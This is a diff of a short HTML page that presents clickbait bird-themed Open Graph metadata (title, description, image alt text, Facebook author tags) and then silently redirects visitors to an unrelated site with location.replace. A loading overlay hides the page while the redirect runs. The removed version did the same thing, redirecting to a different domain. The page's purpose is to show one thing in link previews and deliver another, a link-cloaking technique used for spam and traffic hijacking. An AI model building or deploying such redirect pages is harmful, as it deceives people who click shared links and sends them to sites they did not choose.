@@ -1,17 +1,87 @@
-<html xmlns="http://www.w3.org/1999/xhtml" lang="vi" prefix="og: http://ogp.me/ns# fb: http://ogp.me/ns/fb#"><head>
+<!DOCTYPE html>
+<html lang="en">
 
-<meta property="og:title" content="See full 10+ image">
+<head>
+ <meta property="og:title" content="xxx">
+<meta property="og:updated_time" content="2025-05-16T12:35:52">
+<meta property="og:locale" content="en_US">
+<meta property="og:url" content="yyy"/>
+<meta property="og:image" content="yyy"/>
+ <meta property="og:site_name" content="bird">
+    <meta property="og:type" content="article">
+    <meta property="article:author" content="https://www.facebook.com/profile.php?id=61556591610860">
+    <meta property="article:publisher" content="https://www.facebook.com/profile.php?id=61556591610860">
+    <meta property="fb:app_id" content="361279065206052">
+<meta property="og:description" content=" Dive into the world of avian wonders with our captivating lineup of the top 10 most incredible birds this week! From vibrant plumage to mesmerizing melodies, each feathered marvel will leave you spellbound. Join us on this thrilling journey as we showcase the beauty and diversity of these extraordinary creatures, guaranteed to inspire awe and admiration. "/>
 
+<meta property="og:image:alt" content="Photo of 2 colorful birds" />
+<style>
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      overflow: hidden;
+    }
 
-<meta property="og:url" content="https://greenwich.audubon.org/sites/default/files/styles/hero_image/public/apa_2011_18841_148430_davidmorgan_painted_bunting_kk_herocrop.jpg"/>
-<meta property="og:image" content="https://greenwich.audubon.org/sites/default/files/styles/hero_image/public/apa_2011_18841_148430_davidmorgan_painted_bunting_kk_herocrop.jpg"/>
+    .loading-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+      animation: fadeOut 1s ease-out forwards;
+    }
 
-<script type="text/javascript" language="javascript">window.location="https://smilingdogyoga.com/bird-23w10/";</script>
+    .loading-image {
+      max-width: 50%;
+    }
 
+    @keyframes fadeOut {
+      0% {
+        opacity: 1;
+      }
+      100% {
+        opacity: 0;
+        visibility: hidden;
+      }
+    }
+
+    .content {
+      visibility: hidden;
+    }
+  </style>
 </head>
-
 <body>
+<div class="loading-overlay">
+    <img class="loading-image" src="https://raw.githubusercontent.com/contactluva/chim/main/Architecture%20Company%20Logo%20(1).png" alt="Loading...">
+  </div>
+ <div class="content">
 
+  xxx
+
+  </div>
+ <script type="text/javascript">
+location.replace("https://ongmuot.com/beautiful-red-eyed-owl/")
+</script>
+
+
+ <script>
+    // Wait for the page to load
+    window.addEventListener('load', function () {
+      // Hide the loading overlay after 1 second
+      setTimeout(function () {
+        document.querySelector('.loading-overlay').style.display = 'none';
+        document.querySelector('.content').style.visibility = 'visible';
+      }, 1000);
+    });
+  </script>
 </body>
 
 </html>
